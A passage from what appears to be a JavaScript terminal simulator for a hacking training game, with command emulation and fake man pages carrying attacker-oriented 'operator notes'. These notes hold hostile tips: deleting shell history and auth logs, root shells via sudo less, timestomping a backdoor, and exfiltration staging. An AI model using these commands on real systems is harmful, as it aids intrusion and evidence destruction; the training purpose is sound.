                        output = `bash: ${cmd}: No such file or directory`;
                    }
                } else {
                    output = `${cmd}: command not found`;
                }
        }

        if (output) {
            this._printOutput(output);
        }

        // Check objectives
        this._checkObjectives(cmdLine, output);

        // Callback
        this._onCommand(cmdLine, output);
    }

    _printCommand(cmd) {
        const line = document.createElement('div');
        line.className = 'terminal-line';
        line.innerHTML = `<span class="prompt">${this.user}@${this.hostname}:${this._getDisplayPath()}$</span> <span class="command">${this._escapeHtml(cmd)}</span>`;
        this.outputEl.appendChild(line);
        this.outputEl.scrollTop = this.outputEl.scrollHeight;
    }

    _printOutput(text) {
        const line = document.createElement('div');
        line.className = 'terminal-line output';
        line.innerHTML = this._escapeHtml(text).replace(/\n/g, '<br>');
        this.outputEl.appendChild(line);
        this.outputEl.scrollTop = this.outputEl.scrollHeight;
    }

    _escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    _getDisplayPath() {
        if (this.currentDir === `/home/${this.user}`) return '~';
        return this.currentDir.replace(`/home/${this.user}`, '~');
    }

    _resolvePath(path) {
        if (!path) return this.currentDir;
        if (path === '~') return `/home/${this.user}`;
        if (path.startsWith('~/')) return `/home/${this.user}${path.slice(1)}`;
        if (path.startsWith('/')) return this._normalizePath(path);
        return this._normalizePath(`${this.currentDir}/${path}`);
    }

    _normalizePath(path) {
        const parts = path.split('/').filter(p => p && p !== '.');
        const result = [];
        for (const part of parts) {
            if (part === '..') result.pop();
            else result.push(part);
        }
        return '/' + result.join('/');
    }

    _checkObjectives(cmdLine, output) {
        // Create state object for check functions
        const state = {
            currentDir: this.currentDir,
            env: this.env,
            user: this.user,
            hostname: this.hostname,
            fs: this.fs
        };

        for (const obj of this.objectives) {
            if (this.objectivesCompleted[obj.id]) continue;

            let completed = false;
            if (typeof obj.check === 'function') {
                completed = obj.check(cmdLine, state, output);
            } else if (typeof obj.check === 'string') {
                completed = cmdLine.includes(obj.check);
            }

            if (completed) {
                this.objectivesCompleted[obj.id] = true;
                this.completedCount++;
                this._onObjectiveComplete(obj.id, this.completedCount, this.objectives.length);

                if (this.completedCount === this.objectives.length) {
                    this._onModuleComplete();
                }
                break;
            }
        }
    }

    // Command implementations
    _cmdPwd() { return this.currentDir; }

    _cmdLs(args) {
        let showHidden = args.includes('-a') || args.includes('-la') || args.includes('-al');
        let longFormat = args.includes('-l') || args.includes('-la') || args.includes('-al');
        let path = args.filter(a => !a.startsWith('-'))[0] || '.';

        const resolved = this._resolvePath(path);
        const entry = this.fs[resolved];
        const lsDate = 'Jan 17 09:00';

        if (!entry) return `ls: cannot access '${path}': No such file or directory`;
        if (entry.type !== 'dir') {
            const displayName = entry.type === 'symlink' ? `${path} -> ${entry.target}` : path;
            return longFormat ? `${entry.perms} 1 ${entry.owner} ${entry.group} ${(entry.content || '').length} ${lsDate} ${displayName}` : path;
        }

        let children = entry.children || [];
        if (!showHidden) children = children.filter(c => !c.startsWith('.'));

        if (longFormat) {
            const lines = ['total ' + children.length];
            for (const child of children) {
                const childPath = resolved === '/' ? `/${child}` : `${resolved}/${child}`;
                const childEntry = this.fs[childPath];
                if (childEntry) {
                    const size = childEntry.type === 'file' ? (childEntry.content || '').length : 4096;
                    let displayName = child;
                    if (childEntry.type === 'symlink') {
                        displayName = `${child} -> ${childEntry.target}`;
                    }
                    lines.push(`${childEntry.perms} 1 ${childEntry.owner} ${childEntry.group} ${String(size).padStart(5)} ${lsDate} ${displayName}`);
                }
            }
            return lines.join('\n');
        }
        return children.join('  ');
    }

    _cmdCd(args) {
        let path = args[0];

        // No argument = go home
        if (!path) path = '~';

        // Empty string after variable expansion = error
        if (path === '') {
            return 'cd: empty path';
        }

        let resolved = this._resolvePath(path);
        let entry = this.fs[resolved];

        if (!entry) return `cd: ${path}: No such file or directory`;

        // Follow symlinks (up to 10 levels)
        let symlinkCount = 0;
        while (entry && entry.type === 'symlink' && symlinkCount < 10) {
            resolved = this._resolvePath(entry.target);
            entry = this.fs[resolved];
            symlinkCount++;
            if (!entry) {
                return `cd: ${path}: Too many levels of symbolic links`;
            }
        }

        if (!entry) return `cd: ${path}: No such file or directory`;
        if (entry.type === 'symlink') return `cd: ${path}: Too many levels of symbolic links`;
        if (entry.type !== 'dir') return `cd: ${path}: Not a directory`;

        this.currentDir = resolved;
        this.env.PWD = resolved;
        return '';
    }

    _cmdCat(args) {
        if (!args.length) return 'cat: missing operand';
        const results = [];
        for (const arg of args) {
            if (arg.startsWith('-')) continue;
            const resolved = this._resolvePath(arg);
            const entry = this.fs[resolved];
            if (!entry) results.push(`cat: ${arg}: No such file or directory`);
            else if (entry.type === 'dir') results.push(`cat: ${arg}: Is a directory`);
            else results.push(entry.content || '');
        }
        return results.join('\n');
    }

    _cmdBash(args) {
        // No arguments - just show bash info
        if (!args.length) {
            return 'GNU bash, version 5.1.16(1)-release\nType \'exit\' to exit the shell.';
        }

        // Handle flags
        const flags = args.filter(a => a.startsWith('-'));
        const scriptPath = args.find(a => !a.startsWith('-'));

        if (!scriptPath) {
            if (flags.includes('-c')) {
                return '[bash -c execution simulated]';
            }
            return 'bash: no script specified';
        }

        // Resolve script path
        const resolved = this._resolvePath(scriptPath);
        const entry = this.fs[resolved];

        if (!entry) {
            return `bash: ${scriptPath}: No such file or directory`;
        }

        if (entry.type === 'dir') {
            return `bash: ${scriptPath}: Is a directory`;
        }

        // Get script content
        const content = entry.content || '';
        const lines = content.split('\n');

        // Script-local variables
        const scriptVars = {};

        // Helper to expand variables in a string
        const expandVars = (str) => {
            // Expand command substitution $(...)
            str = str
                .replace(/\$\(whoami\)/g, this.user)
                .replace(/\$\(hostname\)/g, this.hostname)
                .replace(/\$\(pwd\)/g, this.currentDir)
                .replace(/\$\(date[^)]*\)/g, () => {
                    const d = new Date();
                    return `${d.getFullYear()}${String(d.getMonth()+1).padStart(2,'0')}${String(d.getDate()).padStart(2,'0')}_${String(d.getHours()).padStart(2,'0')}${String(d.getMinutes()).padStart(2,'0')}`;
                });

            // Expand script-local variables first (${VAR} and $VAR)
            str = str.replace(/\$\{(\w+)\}/g, (m, v) => scriptVars[v] || this.env[v] || '');
            str = str.replace(/\$(\w+)/g, (m, v) => scriptVars[v] || this.env[v] || '');

            return str;
        };

        // Build simulated output
        const outputLines = [];

        for (const line of lines) {
            const trimmed = line.trim();

            // Skip empty lines, comments, shebang
            if (!trimmed || trimmed.startsWith('#')) continue;

            // Check for variable assignment: VAR=value or VAR="value"
            const assignMatch = trimmed.match(/^(\w+)=(.*)$/);
            if (assignMatch && !trimmed.includes(' ')) {
                const varName = assignMatch[1];
                let varValue = assignMatch[2];
                // Remove quotes
                varValue = varValue.replace(/^["']|["']$/g, '');
                // Expand any variables/commands in the value
                varValue = expandVars(varValue);
                scriptVars[varName] = varValue;
                continue; // Variable assignments don't produce output
            }

            // Expand variables in the line before processing
            const expanded = expandVars(trimmed);

            // Simulate common commands in scripts
            if (expanded.startsWith('echo ')) {
                let echoArg = expanded.substring(5).trim();
                // Remove quotes if present
                echoArg = echoArg.replace(/^["']|["']$/g, '');
                outputLines.push(echoArg);
            }
            else if (expanded === 'whoami') {
                outputLines.push(this.user);
            }
            else if (expanded === 'hostname') {
                outputLines.push(this.hostname);
            }
            else if (expanded === 'pwd') {
                outputLines.push(this.currentDir);
            }
            else if (expanded.startsWith('date')) {
                outputLines.push(new Date().toString());
            }
            else if (expanded.startsWith('ls')) {
                outputLines.push(this._cmdLs(expanded.split(' ').slice(1)));
            }
            else if (expanded.startsWith('cat ')) {
                const catFile = expanded.substring(4).trim();
                outputLines.push(this._cmdCat([catFile]));
            }
            else if (expanded.startsWith('mkdir ')) {
                const mkdirArgs = expanded.split(' ').slice(1).map(a => a.replace(/^["']|["']$/g, ''));
                const mkdirResult = this._cmdMkdir(mkdirArgs);
                if (mkdirResult) outputLines.push(mkdirResult);
            }
            else if (expanded.startsWith('cp ')) {
                // Simulate cp - parse args for better output
                const cpArgs = expanded.split(' ').slice(1);
                if (cpArgs.length >= 2) {
                    const src = cpArgs[cpArgs.length - 2];
                    const dest = cpArgs[cpArgs.length - 1];
                    // Actually try to copy if source exists
                    const srcPath = this._resolvePath(src);
                    const srcEntry = this.fs[srcPath];
                    if (srcEntry && srcEntry.type === 'dir') {
                        // Copy directory contents (simplified)
                    }
                }
            }
            else if (expanded.startsWith('ip ') || expanded === 'ifconfig') {
                outputLines.push(this._cmdIfconfig());
            }
            else {
                // For unrecognized commands, just show them as simulated
                outputLines.push(`[${expanded}]`);
            }
        }

        if (outputLines.length === 0) {
            return '[script executed - no output]';
        }

        return outputLines.join('\n');
    }

    _cmdUname(args) {
        if (args.includes('-a')) return `Linux ${this.hostname} 5.15.0-generic #1 SMP x86_64 GNU/Linux`;
        if (args.includes('-r')) return '5.15.0-generic';
        if (args.includes('-n')) return this.hostname;
        return 'Linux';
    }

    _cmdHelp() {
        return `Available commands:
  Navigation:   pwd, cd, ls, tree, find, locate
  Files:        cat, head, tail, less, more, file, stat, touch, mkdir, rm, cp, mv
  Search:       grep, wc
  Text:         echo, sort, uniq, cut, tr, sed, awk, tee, xargs
  Crypto:       base64, md5sum, sha1sum, sha256sum, strings
  Archives:     tar, gzip, gunzip, zip, unzip
  System:       uname, hostname, whoami, id, date, uptime, free, vmstat, iostat
  Process:      ps, top, kill, pkill, jobs, fg, bg
  Network:      ip, ifconfig, netstat, ss, ping, nslookup, dig, traceroute, arp, route
  Security:     nmap, nc, tcpdump, whois
  Disk:         df, du, lsblk, mount, fdisk
  Users:        w, last, who, useradd, userdel, passwd
  Permissions:  chmod, chown, chgrp, getfacl
  Services:     systemctl, service, crontab
  Packages:     apt, apt-get, dpkg
  Remote:       ssh, scp, curl, wget
  Editors:      vim, vi, nano
  Other:        echo, env, export, history, alias, clear, help, man, which, type

Shell features:
  Tab completion, history (Up/Down), Ctrl+C/L/R/Z/A/E/U/K/W/D
  Pipes (|), redirection (>, >>, <), chaining (&&, ||, ;), background (&)
  Wildcards (*, ?, {a,b}), variables ($VAR)

Type 'man <cmd>' for help on specific commands.`;
    }

    _cmdMan(args) {
        const cmd = args[0];
        if (!cmd) {
            return `What manual page do you want?
For example, try 'man man'.`;
        }

        const manPages = {
            // Man itself
            'man': `MAN(1)                        Manual pager utils                        MAN(1)

NAME
       man - an interface to the system reference manuals

SYNOPSIS
       man [OPTION...] [SECTION] PAGE...

DESCRIPTION
       man  is  the system's manual pager. Each page argument given to man is
       normally the name of a program, utility or function.

       The table below shows the section numbers of the manual followed by the
       types of pages they contain.

       1   Executable programs or shell commands
       2   System calls (functions provided by the kernel)
       3   Library calls (functions within program libraries)
       4   Special files (usually found in /dev)
       5   File formats and conventions, e.g. /etc/passwd
       6   Games
       7   Miscellaneous
       8   System administration commands (usually only for root)
       9   Kernel routines [Non standard]

EXAMPLES
       man ls
           Display the manual page for the item (program) ls.

       man man.7
           Display the manual page for macro package man from section 7.

OPERATOR NOTES
       Use man when you need to:
       • Learn the correct syntax and options for any command
       • Understand what flags are available before using a tool
       • Find related commands in the SEE ALSO section

       Pro tip: Real operators read the manual. When you encounter an
       unfamiliar command on a target system, man is your first resource.
       The best hackers know their tools inside and out.

SEE ALSO
       apropos(1), whatis(1), less(1), groff(1)`,

            // Shell
            'bash': `BASH(1)                        Shell Commands                         BASH(1)

NAME
       bash - GNU Bourne-Again SHell

SYNOPSIS
       bash [options] [file]

DESCRIPTION
       Bash is a command language interpreter that executes commands read from
       standard input or from a file. Bash also incorporates useful features
       from the Korn and C shells (ksh and csh).

RUNNING SCRIPTS
       bash script.sh
              Execute script.sh using the bash interpreter.

       ./script.sh
              Execute script directly (requires execute permission).
              Use: chmod +x script.sh first.

       source script.sh
              Execute script in current shell (variables persist).

SCRIPT BASICS
       #!/bin/bash
              Shebang - first line declares the interpreter.

       # comment
              Lines starting with # are comments (except shebang).

       VARIABLE="value"
              Set a variable (no spaces around =).

       $VARIABLE or \${VARIABLE}
              Expand/use a variable's value.

       $(command)
              Command substitution - replaced with command output.

COMMON PATTERNS
       #!/bin/bash
       # Recon script example
       TARGET=$(hostname)
       echo "Target: $TARGET"
       echo "User: $(whoami)"
       echo "Time: $(date +%Y%m%d_%H%M)"

OPERATOR NOTES
       Use bash when you need to:
       • Automate repetitive tasks during operations
       • Chain multiple commands into reusable scripts
       • Create portable tools that work across systems
       • Set up persistence or scheduled tasks

       Pro tip: Always start scripts with #!/bin/bash and add comments.
       When you find scripts on a target, cat them first to understand
       what they do before executing. Never run unknown scripts blindly.

       Debugging: Use bash -x script.sh to see each command as it runs.

SEE ALSO
       sh(1), source(1), chmod(1), echo(1)`,

            // Navigation
            'ls': `LS(1)                           User Commands                          LS(1)

NAME
       ls - list directory contents

SYNOPSIS
       ls [OPTION]... [FILE]...

DESCRIPTION
       List  information  about  the FILEs (the current directory by default).
       Sort entries alphabetically if none of -cftuvSUX nor --sort is specified.

       -a, --all
              do not ignore entries starting with .

       -l     use a long listing format

       -h, --human-readable
              with -l, print sizes like 1K 234M 2G etc.

       -r, --reverse
              reverse order while sorting

       -R, --recursive
              list subdirectories recursively

       -t     sort by time, newest first

EXAMPLES
       ls -la
              List all files including hidden, in long format.

       ls -lh /var/log
              List files in /var/log with human-readable sizes.

OPERATOR NOTES
       Use ls when you need to:
       • Survey a directory's contents during reconnaissance
       • Find hidden files (.bashrc, .ssh, .bash_history) with -a
       • Check file permissions and ownership with -l
       • Identify recently modified files with -lt (newest first)

       Pro tip: ls -la is your first command when landing in any directory.
       Hidden files often contain credentials, history, and config data.
       Always check for .ssh/, .gnupg/, and .*_history files.

SEE ALSO
       dir(1), find(1), stat(1)`,

            'cd': `CD(1)                        Bash Builtins                           CD(1)

NAME
       cd - change the working directory

SYNOPSIS
       cd [-L|[-P [-e]] [-@]] [dir]

DESCRIPTION
       Change  the  current  directory to dir.  if dir is not supplied, the
       value of the HOME shell variable is the default.

       The variable CDPATH defines the search path for the directory.

       -L     force symbolic links to be followed

       -P     use the physical directory structure without following symlinks

EXAMPLES
       cd /var/log
              Change to the /var/log directory.

       cd ~
              Change to home directory.

       cd ..
              Change to parent directory.

       cd -
              Change to previous directory.

OPERATOR NOTES
       Use cd when you need to:
       • Navigate to key directories during system enumeration
       • Move to /var/log for log analysis
       • Access /etc for configuration file review
       • Check user home directories for sensitive data

       Pro tip: Know your critical paths by heart:
       /etc (configs), /var/log (logs), /tmp (temp files),
       /home (user data), /root (root's home), /opt (third-party apps).
       cd - is invaluable for jumping between two locations.

SEE ALSO
       pwd(1), pushd(1), popd(1)`,

            'pwd': `PWD(1)                          User Commands                         PWD(1)

NAME
       pwd - print name of current/working directory

SYNOPSIS
       pwd [OPTION]...

DESCRIPTION
       Print the full filename of the current working directory.

       -L, --logical
              use PWD from environment, even if it contains symlinks

       -P, --physical
              avoid all symlinks

OPERATOR NOTES
       Use pwd when you need to:
       • Confirm your current location in the filesystem
       • Get the full path for scripts or documentation
       • Verify you're in the correct directory before operations

       Pro tip: Always know where you are. Getting lost in a filesystem
       during an operation wastes time. Use pwd -P to see the real path
       if symlinks might be hiding your true location.

SEE ALSO
       cd(1), getcwd(3)`,

            // File operations
            'cat': `CAT(1)                          User Commands                         CAT(1)

NAME
       cat - concatenate files and print on the standard output

SYNOPSIS
       cat [OPTION]... [FILE]...

DESCRIPTION
       Concatenate FILE(s) to standard output.

       With no FILE, or when FILE is -, read standard input.

       -A, --show-all
              equivalent to -vET

       -n, --number
              number all output lines

       -b, --number-nonblank
              number nonempty output lines, overrides -n

       -E, --show-ends
              display $ at end of each line

       -T, --show-tabs
              display TAB characters as ^I

EXAMPLES
       cat file1 file2
              Concatenate file1 and file2 to stdout.

       cat -n /etc/passwd
              Display passwd file with line numbers.

OPERATOR NOTES
       Use cat when you need to:
       • Quickly view small configuration files
       • Read /etc/passwd, /etc/shadow (if accessible), /etc/hosts
       • Display SSH keys, cron files, or shell histories
       • Combine multiple files into one output stream

       Pro tip: cat is fast but floods your terminal with large files.
       For large logs, use head, tail, or less instead. Key targets:
       /etc/passwd (users), ~/.ssh/authorized_keys, ~/.bash_history

SEE ALSO
       head(1), tail(1), tac(1), more(1), less(1)`,

            'head': `HEAD(1)                         User Commands                        HEAD(1)

NAME
       head - output the first part of files

SYNOPSIS
       head [OPTION]... [FILE]...

DESCRIPTION
       Print  the first 10 lines of each FILE to standard output.
       With more than one FILE, precede each with a header giving the file name.

       -c, --bytes=[-]NUM
              print the first NUM bytes of each file

       -n, --lines=[-]NUM
              print the first NUM lines instead of the first 10

       -q, --quiet, --silent
              never print headers giving file names

EXAMPLES
       head -n 20 file.txt
              Display first 20 lines of file.txt.

       head -c 100 file.bin
              Display first 100 bytes of file.bin.

OPERATOR NOTES
       Use head when you need to:
       • Preview the structure of a file without loading it all
       • Check file headers and magic bytes (head -c 16)
       • Read the beginning of logs to understand their format
       • Sample data files before processing

       Pro tip: Use head -c to inspect binary files for magic bytes.
       PNG starts with 89 50 4E 47, ELF with 7F 45 4C 46.
       This helps identify file types regardless of extension.

SEE ALSO
       tail(1), cat(1), less(1)`,

            'tail': `TAIL(1)                         User Commands                        TAIL(1)

NAME
       tail - output the last part of files

SYNOPSIS
       tail [OPTION]... [FILE]...

DESCRIPTION
       Print the last 10 lines of each FILE to standard output.
       With more than one FILE, precede each with a header giving the file name.

       -c, --bytes=[+]NUM
              output the last NUM bytes

       -f, --follow[={name|descriptor}]
              output appended data as the file grows

       -n, --lines=[+]NUM
              output the last NUM lines, instead of the last 10

EXAMPLES
       tail -n 20 /var/log/syslog
              Display last 20 lines of syslog.

       tail -f /var/log/auth.log
              Follow auth.log in real-time.

OPERATOR NOTES
       Use tail when you need to:
       • View the most recent entries in log files
       • Monitor live log activity with -f (follow mode)
       • Check recent authentication attempts in auth.log
       • Watch for new entries during active investigation

       Pro tip: tail -f is essential for real-time monitoring.
       Watch /var/log/auth.log for login attempts,
       /var/log/syslog for system events. Use Ctrl+C to exit follow mode.
       Combine with grep: tail -f /var/log/auth.log | grep "Failed"

SEE ALSO
       head(1), cat(1), less(1)`,

            'less': `LESS(1)                         User Commands                        LESS(1)

NAME
       less - opposite of more

SYNOPSIS
       less [options] [file ...]

DESCRIPTION
       Less is a program similar to more, but allows backward movement
       in the file as well as forward movement. Also, less does not have
       to read the entire input file before starting.

NAVIGATION
       Space, f, Page Down    Forward one window
       b, Page Up             Backward one window
       j, Down Arrow          Forward one line
       k, Up Arrow            Backward one line
       g                      Go to first line
       G                      Go to last line
       /pattern               Search forward for pattern
       ?pattern               Search backward for pattern
       n                      Next search match
       N                      Previous search match
       q                      Quit

EXAMPLES
       less /var/log/syslog
              View syslog with navigation.

       cat file | less
              Pipe output to less for pagination.

       less +F /var/log/auth.log
              Follow mode (like tail -f, Ctrl+C to stop).

PRIVILEGE ESCALATION
       When run via sudo, less can spawn a shell:
       sudo less /var/log/auth.log
       !sh                              (spawns shell as root)
       !/bin/bash                       (spawns bash as root)

       This works because less allows shell commands with !

OPERATOR NOTES
       Use less when you need to:
       • Navigate large log files
       • Search within files interactively
       • View files without loading entirely into memory

       Pro tip: less is both a viewer AND a privesc vector.
       If you can sudo less ANY file, you can get root shell.

SEE ALSO
       more(1), cat(1), tail(1)`,

            'more': `MORE(1)                         User Commands                        MORE(1)

NAME
       more - file perusal filter for viewing

SYNOPSIS
       more [options] file [...]

DESCRIPTION
       more is a filter for paging through text one screenful at a time.

NAVIGATION
       Space           Display next screenful
       Enter           Display next line
       q               Quit
       /pattern        Search for pattern
       n               Find next occurrence

EXAMPLES
       more /etc/passwd
              View passwd file page by page.

       dmesg | more
              Page through kernel messages.

OPERATOR NOTES
       Use more when you need to:
       • View files on minimal systems where less isn't available
       • Quick pagination of command output

       Pro tip: less is more powerful than more. Use less when available.
       Like less, more can spawn shells via sudo: !sh

SEE ALSO
       less(1), cat(1), pg(1)`,

            'cp': `CP(1)                           User Commands                          CP(1)

NAME
       cp - copy files and directories

SYNOPSIS
       cp [OPTION]... SOURCE DEST
       cp [OPTION]... SOURCE... DIRECTORY

DESCRIPTION
       Copy SOURCE to DEST, or multiple SOURCE(s) to DIRECTORY.

       -r, -R, --recursive
              copy directories recursively

       -i, --interactive
              prompt before overwrite

       -f, --force
              if destination cannot be opened, remove it and try again

       -p     preserve mode, ownership, timestamps

       -v, --verbose
              explain what is being done

EXAMPLES
       cp file.txt backup.txt
              Copy file to new name.

       cp -r /var/log /tmp/logs_backup
              Recursively copy directory.

       cp -p important.conf important.conf.bak
              Copy preserving permissions/timestamps.

       cp file1 file2 file3 /backup/
              Copy multiple files to directory.

OPERATOR NOTES
       Use cp when you need to:
       • Backup files before modification
       • Stage files for exfiltration
       • Copy configs for offline analysis
       • Duplicate files to writable locations

       Pro tip: Always backup before editing: cp file file.bak
       Preserve evidence: cp -p maintains original timestamps.
       Exfil staging: cp sensitive_data /tmp/

SEE ALSO
       mv(1), rm(1), dd(1)`,

            'mv': `MV(1)                           User Commands                          MV(1)

NAME
       mv - move (rename) files

SYNOPSIS
       mv [OPTION]... SOURCE DEST
       mv [OPTION]... SOURCE... DIRECTORY

DESCRIPTION
       Rename SOURCE to DEST, or move SOURCE(s) to DIRECTORY.

       -i, --interactive
              prompt before overwrite

       -f, --force
              do not prompt before overwriting

       -v, --verbose
              explain what is being done

       -n, --no-clobber
              do not overwrite existing file

EXAMPLES
       mv oldname.txt newname.txt
              Rename a file.

       mv file.txt /backup/
              Move file to directory.

       mv *.log /var/archive/
              Move multiple files.

       mv -i important.conf /etc/
              Move with overwrite confirmation.

OPERATOR NOTES
       Use mv when you need to:
       • Rename files to hide activity
       • Move files to staging directories
       • Relocate configs or logs

       Pro tip: mv is atomic - file disappears from source instantly.
       For stealth: mv file /tmp/.hidden_name
       Hidden directories: mv data /tmp/...  (triple dot is valid)

SEE ALSO
       cp(1), rm(1), rename(1)`,

            'rm': `RM(1)                           User Commands                          RM(1)

NAME
       rm - remove files or directories

SYNOPSIS
       rm [OPTION]... FILE...

DESCRIPTION
       rm removes each specified file. By default, it does not remove
       directories.

       -r, -R, --recursive
              remove directories and their contents recursively

       -f, --force
              ignore nonexistent files, never prompt

       -i     prompt before every removal

       -v, --verbose
              explain what is being done

EXAMPLES
       rm file.txt
              Remove a file.

       rm -rf directory/
              Force remove directory and contents (DANGEROUS).

       rm -i *.log
              Remove logs with confirmation.

       rm -- -filename
              Remove file starting with dash.

WARNING
       rm -rf is IRREVERSIBLE. There is no trash/recycle bin.
       Double-check paths before running rm -rf.

       NEVER run: rm -rf /     (destroys entire system)
       NEVER run: rm -rf /*    (same effect)

OPERATOR NOTES
       Use rm when you need to:
       • Clean up temporary files
       • Remove traces of activity
       • Delete logs (anti-forensics)

       Pro tip: Attackers use rm to cover tracks:
       rm -f ~/.bash_history
       rm -f /var/log/auth.log
       rm -rf /tmp/*

       For secure deletion: shred -u file (overwrites then removes)

SEE ALSO
       rmdir(1), shred(1), unlink(2)`,

            'mkdir': `MKDIR(1)                        User Commands                       MKDIR(1)

NAME
       mkdir - make directories

SYNOPSIS
       mkdir [OPTION]... DIRECTORY...

DESCRIPTION
       Create the DIRECTORY(ies), if they do not already exist.

       -m, --mode=MODE
              set file mode (as in chmod)

       -p, --parents
              make parent directories as needed, no error if existing

       -v, --verbose
              print a message for each created directory

EXAMPLES
       mkdir newdir
              Create a directory.

       mkdir -p /path/to/deep/directory
              Create nested directories (parents too).

       mkdir -m 700 private
              Create with specific permissions.

       mkdir dir1 dir2 dir3
              Create multiple directories.

OPERATOR NOTES
       Use mkdir when you need to:
       • Create staging directories for exfiltration
       • Set up persistence locations
       • Create hidden directories for tools

       Pro tip: Hidden directories:
       mkdir .hidden          (dot prefix - hidden from ls)
       mkdir '...'            (triple dot - looks like parent ref)
       mkdir -p /tmp/.cache/.data/staging  (nested hidden)

SEE ALSO
       rmdir(1), chmod(1)`,

            'touch': `TOUCH(1)                        User Commands                       TOUCH(1)

NAME
       touch - change file timestamps

SYNOPSIS
       touch [OPTION]... FILE...

DESCRIPTION
       Update the access and modification times of each FILE to the
       current time. Create empty files if they do not exist.

       -a     change only the access time

       -m     change only the modification time

       -t STAMP
              use [[CC]YY]MMDDhhmm[.ss] instead of current time

       -r, --reference=FILE
              use this file's times instead of current time

       -c, --no-create
              do not create any files

EXAMPLES
       touch newfile.txt
              Create empty file (or update timestamp if exists).

       touch -t 202301151200 file.txt
              Set specific timestamp (Jan 15, 2023, 12:00).

       touch -r reference.txt target.txt
              Copy timestamps from reference to target.

       touch -d "2 days ago" file.txt
              Set timestamp relative to now.

ANTI-FORENSICS
       Attackers use touch to manipulate timestamps:
       touch -r /etc/passwd malware.sh
              Make malware look old (same time as passwd)

       This is called "timestomping" - hiding file modification.
       Forensic analysts check for timestamp inconsistencies.

OPERATOR NOTES
       Use touch when you need to:
       • Create empty files
       • Update timestamps to avoid detection
       • Make planted files blend in with system files

       Pro tip: Match timestamps to nearby files:
       touch -r /bin/ls /tmp/backdoor
       This makes backdoor look as old as /bin/ls

SEE ALSO
       stat(1), date(1)`,

            'ln': `LN(1)                           User Commands                          LN(1)

NAME
       ln - make links between files

SYNOPSIS
       ln [OPTION]... TARGET LINK_NAME
       ln [OPTION]... TARGET... DIRECTORY

DESCRIPTION
       Create a link to TARGET with the name LINK_NAME.

       By default, creates hard links. Use -s for symbolic links.

       -s, --symbolic
              make symbolic links instead of hard links

       -f, --force
              remove existing destination files

       -v, --verbose
              print name of each linked file

LINK TYPES
       Hard link:  Points to same inode (data on disk)
                   Cannot cross filesystems
                   Survives if original is deleted

       Symbolic:   Points to filename (path)
                   Can cross filesystems
                   Breaks if original is deleted

EXAMPLES
       ln -s /var/log/syslog ~/syslog
              Create symlink in home to syslog.

       ln -s /usr/bin/python3 /usr/bin/python
              Create python alias.

       ln file.txt hardlink.txt
              Create hard link.

       ln -sf new_target existing_link
              Force update symlink target.

OPERATOR NOTES
       Use ln when you need to:
       • Create shortcuts to deeply nested files
       • Set up path hijacking attacks
       • Access files from different locations

       Pro tip: Symlink attacks (path traversal):
       If a program follows symlinks carelessly, you can trick it:
       ln -s /etc/shadow /tmp/readable_file

       Check for vulnerable symlinks in web directories.

SEE ALSO
       cp(1), mv(1), readlink(1)`,

            // Search
            'grep': `GREP(1)                         User Commands                        GREP(1)

NAME
       grep, egrep, fgrep - print lines that match patterns

SYNOPSIS
       grep [OPTION...] PATTERNS [FILE...]

DESCRIPTION
       grep  searches  for PATTERNS in each FILE.  PATTERNS is one or more
       patterns separated by newline characters, and grep prints each line
       that matches a pattern.

       -i, --ignore-case
              ignore case distinctions in patterns and data

       -v, --invert-match
              select non-matching lines

       -c, --count
              print only a count of selected lines per FILE

       -n, --line-number
              prefix each line of output with the line number

       -r, --recursive
              read all files under each directory, recursively

       -l, --files-with-matches
              print only names of FILEs with selected lines

       -E, --extended-regexp
              interpret PATTERNS as extended regular expressions

EXAMPLES
       grep "error" /var/log/syslog
              Search for "error" in syslog.

       grep -r "TODO" .
              Recursively search for TODO in current directory.

       grep -i "warning" *.log
              Case-insensitive search in all .log files.

       ps aux | grep nginx
              Find nginx processes.

OPERATOR NOTES
       Use grep when you need to:
       • Search logs for suspicious activity (failed logins, errors)
       • Find passwords, keys, or credentials in config files
       • Filter command output (ps aux | grep process)
       • Hunt for indicators of compromise across filesystems

       Pro tip: grep is your primary hunting tool. Master these patterns:
       grep -r "password" /etc/         # Find hardcoded passwords
       grep "Failed" /var/log/auth.log  # Failed login attempts
       grep -E "[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}" file  # IP addresses
       Use -v to exclude noise: grep -v "^#" config  # Skip comments

SEE ALSO
       awk(1), sed(1), find(1), regex(7)`,

            'find': `FIND(1)                         User Commands                        FIND(1)

NAME
       find - search for files in a directory hierarchy

SYNOPSIS
       find [-H] [-L] [-P] [-D debugopts] [-Olevel] [path...] [expression]

DESCRIPTION
       This manual page documents the GNU version of find.  GNU find searches
       the directory tree rooted at each given starting-point by evaluating
       the given expression from left to right.

       -name pattern
              Base of file name matches shell pattern pattern.

       -type c
              File is of type c:
              b      block (buffered) special
              c      character (unbuffered) special
              d      directory
              f      regular file
              l      symbolic link

       -mtime n
              File's data was last modified n*24 hours ago.

       -size n[cwbkMG]
              File uses n units of space.

       -exec command ;
              Execute command on each found file.

EXAMPLES
       find /home -name "*.txt"
              Find all .txt files in /home.

       find . -type f -mtime -7
              Find files modified in last 7 days.

       find /var/log -name "*.log" -exec rm {} \\;
              Delete all .log files in /var/log.

OPERATOR NOTES
       Use find when you need to:
       • Locate files by name, type, size, or modification time
       • Hunt for SUID/SGID binaries (privilege escalation vectors)
       • Find world-writable files and directories
       • Discover recently modified files during incident response

       Pro tip: Critical security searches every operator should know:
       find / -perm -4000 2>/dev/null    # SUID binaries (privesc)
       find / -perm -2000 2>/dev/null    # SGID binaries
       find / -perm -o+w 2>/dev/null     # World-writable files
       find / -name "*.sh" -mtime -1     # Scripts modified in 24h
       find /tmp -type f                  # Files in /tmp (suspicious)

SEE ALSO
       locate(1), grep(1), xargs(1), getcap(8)`,

            'getcap': `GETCAP(8)                   System Administration                   GETCAP(8)

NAME
       getcap - examine file capabilities

SYNOPSIS
       getcap [-v] [-n] [-r] [-h] filename [...]

DESCRIPTION
       getcap displays the capabilities on the queried file(s).

       Linux capabilities provide fine-grained control over superuser
       permissions. Instead of giving a program full root access (SUID),
       capabilities grant specific privileges only.

       -r, --recursive
              Enable recursive search.

       -v     Enables verbose mode.

OPTIONS EXPLAINED
       Capabilities are shown in format: /path/binary cap_name=flags

       Flags:
       e      Effective - capability is active
       p      Permitted - capability can be used
       i      Inheritable - passed to child processes

       Example: cap_setuid=ep means setuid is both effective and permitted.

DANGEROUS CAPABILITIES
       cap_setuid
